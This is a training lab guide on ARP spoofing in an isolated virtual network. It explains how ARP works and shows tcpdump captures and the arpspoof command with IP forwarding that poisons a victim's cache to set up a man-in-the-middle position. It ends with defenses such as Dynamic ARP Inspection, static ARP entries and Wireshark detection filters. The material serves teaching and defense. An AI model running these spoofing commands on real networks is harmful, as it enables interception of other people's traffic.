# Lab 02: Network Layer Attacks & ARP Spoofing Mechanics

> **Associated Module:** [Module 02: Information Security Attacks](../docs/modules/module-02-information-security-attacks.md)  
> **Difficulty Level:** Intermediate  
> **Target Environment:** Isolated Virtual Switch Network (2-3 VMs)  
> **Safety Warning:** ARP poisoning redirects and alters Layer 2 ethernet frames. Perform strictly on a dedicated virtual switch network. Never execute on public, home, or corporate LANs.

---

## 🎯 Learning Objectives
By the end of this lab, you will be able to:
1. Explain how the Address Resolution Protocol (ARP) translates Layer 3 IPv4 addresses into Layer 2 hardware MAC addresses.
2. Identify why the absence of state tracking and authentication in RFC 826 makes ARP vulnerable to unsolicited gratuitous spoofing.
3. Observe ARP cache manipulation and frame redirection using terminal diagnostics and Wireshark.
4. Implement hardware-based and host-based mitigations including Static ARP tables and Dynamic ARP Inspection (DAI).

---

## 🛠️ Required Tools & Environment Setup
- **Topology:**
  - **Victim Host (Client A):** Linux VM or Windows VM (e.g., `192.168.56.101`)
  - **Gateway / Server (Host B):** Linux VM representing Gateway (e.g., `192.168.56.1`)
  - **Security Analyst VM (Attacker C):** Kali Linux or Ubuntu (e.g., `192.168.56.105`)
- **Virtual Network:** VirtualBox "Host-Only Adapter" (`vboxnet0`) or VMware "Custom VMnet" with DHCP enabled.
- **Tools:** `ip`, `arp`, `tcpdump`, `wireshark`, `arpspoof` (from `dsniff` package) or Scapy.

---

## 🔬 Practical Scenario
You are conducting a localized network vulnerability assessment for an enterprise branch office. The security architecture relies on an unmanaged switch fabric. You need to demonstrate why Layer 2 boundary segmentation is critical and how an adversary on the local switch can position themselves as a Man-in-the-Middle (MITM) to intercept unencrypted application sessions.

---

## 📋 Step-by-Step Execution Guide

### Step 1: Baseline Verification on Victim Host
Log into the Client VM (`192.168.56.101`) and inspect the existing kernel ARP table:
```bash
ip neigh show
# or classic syntax:
arp -n
```

**Expected Output:**
```text
? (192.168.56.1) at 08:00:27:11:22:33 [ether] on eth0
? (192.168.56.105) at 08:00:27:aa:bb:cc [ether] on eth0
```
Notice that IP `192.168.56.1` correctly maps to the physical gateway MAC `08:00:27:11:22:33`.

---

### Step 2: Observing ARP Resolution Packets
On the Analyst VM, start a `tcpdump` capture filtering for ARP traffic:
```bash
sudo tcpdump -i eth0 -n -e arp
```

In a separate terminal on the Client VM, ping an unused IP or clear the cache to trigger an ARP request:
```bash
ip neigh flush all
ping -c 1 192.168.56.1
```

**Expected Packet Dump Output:**
```text
14:22:01.102345 08:00:27:44:55:66 > ff:ff:ff:ff:ff:ff, ethertype ARP (0x0806), length 42: 
    Request who-has 192.168.56.1 tell 192.168.56.101, length 28
14:22:01.102891 08:00:27:11:22:33 > 08:00:27:44:55:66, ethertype ARP (0x0806), length 42: 
    Reply 192.168.56.1 is-at 08:00:27:11:22:33, length 28
```
*Analysis:* The initial request is a broadcast frame (`ff:ff:ff:ff:ff:ff`) asking every station on the broadcast domain. The target replies with a unicast message containing its MAC address.

---

### Step 3: Demonstrating Gratuitous ARP Poisoning
Because hosts accept unsolicited ARP replies without verifying if a request was sent, an attacker can broadcast false bindings.

On the Analyst VM, simulate the attack using Python Scapy or `arpspoof`:
```bash
# Enable IP forwarding on Analyst VM so traffic is not blackholed:
sudo sysctl -w net.ipv4.ip_forward=1

# Tell victim (192.168.56.101) that Analyst MAC is 192.168.56.1:
sudo arpspoof -i eth0 -t 192.168.56.101 192.168.56.1
```

---

### Step 4: Verification of Compromised ARP Cache
Return to the Victim VM and inspect the ARP table again:
```bash
arp -n
```

**Observed Compromised State:**
```text
Address          HWtype  HWaddress           Flags Mask            Iface
192.168.56.1     ether   08:00:27:aa:bb:cc   C                     eth0
192.168.56.105   ether   08:00:27:aa:bb:cc   C                     eth0
```
*Critical Detection:* Notice that `192.168.56.1` and `192.168.56.105` now point to the **exact same MAC address** (`08:00:27:aa:bb:cc`). Any frame intended for the Internet or default gateway will now physically arrive at the Analyst machine first.

---

## 🛡️ Enterprise Defenses & Mitigations

### 1. Dynamic ARP Inspection (DAI) on Managed Switches
Enterprise switches maintain a trusted **DHCP Snooping Binding Database**. When a client transmits an ARP reply, the switch hardware checks if the IP-to-MAC mapping matches the authenticated DHCP lease.
- If it does not match, the port drops the frame immediately and raises an SNMP alert.

### 2. Static ARP Configuration (Critical Servers)
For high-value static infrastructure (such as default gateways or domain controllers):
```bash
# Set static immutable binding on Linux:
sudo arp -s 192.168.56.1 08:00:27:11:22:33
```
Verification:
```text
192.168.56.1     ether   08:00:27:11:22:33   CM                    eth0
```
*(Notice the `M` flag for Permanent / Static).*

### 3. Wireshark Alert Filters for Blue Teams
In Wireshark, use the following display filters to detect ARP anomalies:
- `arp.duplicate-address-frame`: Identifies duplicate ARP mappings.
- `arp.opcode == 2 && eth.dst != ff:ff:ff:ff:ff:ff`: Identifies gratuitous unicast replies.

---

## 🧹 Environment Cleanup
1. On the Analyst VM, terminate `arpspoof` with `Ctrl + C`.
2. Disable kernel IP forwarding:
   ```bash
   sudo sysctl -w net.ipv4.ip_forward=0
   ```
3. On the Victim VM, flush the ARP cache to restore normal gateway bindings:
   ```bash
   sudo ip neigh flush all
   ping -c 1 192.168.56.1
   ```
